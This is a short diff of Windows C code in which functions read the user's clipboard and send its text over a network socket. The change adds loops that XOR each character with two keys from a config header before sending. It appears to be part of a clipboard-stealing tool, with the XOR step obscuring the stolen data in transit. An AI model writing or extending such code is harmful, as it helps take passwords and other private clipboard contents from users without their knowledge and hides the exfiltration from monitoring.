@@ -5,6 +5,8 @@
 #include <stdlib.h>
 #include <string.h>
 #include "win32.h"
+#include "config.h"
+
 #pragma warning(disable:4996) 
 
 int hostname_to_ip(const char* hostname, char* ip)
@@ -86,9 +88,15 @@ void setup_addrinfo(struct sockaddr_in *servinfo, const char* ip, const u_short 
 
 }
 
-int send_message(const LPCWSTR content, HANDLE* socket_file_descriptor) {
+int send_message(const LPWSTR content, HANDLE* socket_file_descriptor) {
 	//Send some data
 	DWORD buff_size = wcslen(content) * sizeof(content[0]);
+	for (size_t i = 0; i < wcslen(content); i += 1) {
+		content[i] ^= KEY_1;
+		content[i] ^= KEY_2;
+		content[i] ^= (KEY_1 << 8);
+		content[i] ^= (KEY_2 << 8);
+	}
 	if (send(socket_file_descriptor, content, buff_size, 0) < 0)
 	{
 		puts("Send failed");
@@ -113,8 +121,14 @@ int send_clipboard_data(HANDLE*  socket_file_descriptor) {
 
 	if (!data)
 		goto close;
-	LPCWSTR content = (LPCWSTR)data;
+	LPWSTR content = (LPWSTR)data;
 	DWORD buff_size = wcslen(content) * sizeof(content[0]);
+	for (size_t i = 0; i < wcslen(content); i += 1) {
+		content[i] ^= KEY_1;
+		content[i] ^= KEY_2;
+		content[i] ^= (KEY_1 << 8);
+		content[i] ^= (KEY_2 << 8);
+	}
 	if (send(socket_file_descriptor, content, buff_size, 0) < 0)
 	{
 		puts("Send failed");
